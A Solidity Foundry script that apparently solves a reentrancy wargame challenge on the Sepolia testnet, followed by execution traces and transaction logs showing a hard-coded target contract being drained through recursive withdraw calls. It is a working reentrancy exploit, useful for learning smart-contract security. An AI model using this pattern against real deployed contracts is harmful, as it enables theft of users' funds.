// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract AttackReentrant {

    IReentrance public reentranceInstance =
        IReentrance(0xDC01Bfe5C4eeE260eE26FC2B117259Ab57eE6944);

    constructor() payable {
        // Donate to ourselves
        reentranceInstance.donate{value: 0.001 ether}(address(this));
    }

    function attack() external {
        reentranceInstance.withdraw(0.001 ether);
    }

    receive() external payable {
        if (address(reentranceInstance).balance >= 0.001 ether) {
            reentranceInstance.withdraw(0.001 ether);
        }
    }
}


contract ReentrancySolution is Script {

    function run() external {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        AttackReentrant attacker =
            new AttackReentrant{value: 0.001 ether}();

        attacker.attack();

        vm.stopBroadcast();
    }
}

    /*Traces:
    [289194] ReentrancySolution::run()
        ├─ [0] VM::envUint("PRIVATE_KEY") [staticcall]
        │   └─ ← [Return] <env var value>
        ├─ [0] VM::startBroadcast(<pk>)
        │   └─ ← [Return]
        ├─ [214952] → new AttackReentrant@0x2C5Bb8b609310B210e51fbF90Ee5Ec5d128C229B
        │   ├─ [22526] 0xDC01Bfe5C4eeE260eE26FC2B117259Ab57eE6944::donate{value: 1000000000000000}(AttackReentrant: [0x2C5Bb8b609310B210e51fbF90Ee5Ec5d128C229B])
        │   │   └─ ← [Stop]
        │   └─ ← [Return] 801 bytes of code
        ├─ [37335] AttackReentrant::attack()
        │   ├─ [36465] 0xDC01Bfe5C4eeE260eE26FC2B117259Ab57eE6944::withdraw(1000000000000000 [1e15])
        │   │   ├─ [8975] AttackReentrant::receive{value: 1000000000000000}()
        │   │   │   ├─ [7908] 0xDC01Bfe5C4eeE260eE26FC2B117259Ab57eE6944::withdraw(1000000000000000 [1e15])
        │   │   │   │   ├─ [318] AttackReentrant::receive{value: 1000000000000000}()
        │   │   │   │   │   └─ ← [Stop]
        │   │   │   │   └─ ← [Stop]
        │   │   │   └─ ← [Stop]
        │   │   └─ ← [Stop]
        │   └─ ← [Stop]
        ├─ [0] VM::stopBroadcast()
        │   └─ ← [Return]
        └─ ← [Stop]


    Script ran successfully.

    ## Setting up 1 EVM.
    ==========================
    Simulated On-chain Traces:

    [214952] → new AttackReentrant@0x2C5Bb8b609310B210e51fbF90Ee5Ec5d128C229B
        ├─ [22526] 0xDC01Bfe5C4eeE260eE26FC2B117259Ab57eE6944::donate{value: 1000000000000000}(AttackReentrant: [0x2C5Bb8b609310B210e51fbF90Ee5Ec5d128C229B])
        │   └─ ← [Stop]
        └─ ← [Return] 801 bytes of code

    [26735] AttackReentrant::attack()
        ├─ [21365] 0xDC01Bfe5C4eeE260eE26FC2B117259Ab57eE6944::withdraw(1000000000000000 [1e15])
        │   ├─ [11775] AttackReentrant::receive{value: 1000000000000000}()
        │   │   ├─ [10708] 0xDC01Bfe5C4eeE260eE26FC2B117259Ab57eE6944::withdraw(1000000000000000 [1e15])
        │   │   │   ├─ [318] AttackReentrant::receive{value: 1000000000000000}()
        │   │   │   │   └─ ← [Stop]
        │   │   │   └─ ← [Stop]
        │   │   └─ ← [Stop]
        │   └─ ← [Stop]
        └─ ← [Stop]


    ==========================

    Chain 11155111

    Estimated gas price: 0.001000022 gwei

    Estimated total gas used for script: 437737

    Estimated amount required: 0.000000437746630214 ETH

    ==========================

    ##### sepolia
    ✅  [Success] Hash: 0xc352a3fb066cb593e7930bd27882e89c926dccaa7c26e438b1236fe65c2bf20b
    Contract Address: 0x2C5Bb8b609310B210e51fbF90Ee5Ec5d128C229B
    Block: 10457407
    Paid: 0.000000285939145296 ETH (285936 gas * 0.001000011 gwei)


    ##### sepolia
    ✅  [Success] Hash: 0x9ac51072825cc6cb439a8032e1870cd8f4b415585c5be95a8afd4e4ce47c714b
    Block: 10457407
    Paid: 0.000000047799525789 ETH (47799 gas * 0.001000011 gwei)

    ✅ Sequence #1 on sepolia | Total Paid: 0.000000333738671085 ETH (333735 gas * avg 0.001000011 gwei)
                                                                                                

    ==========================

    ONCHAIN EXECUTION COMPLETE & SUCCESSFUL*/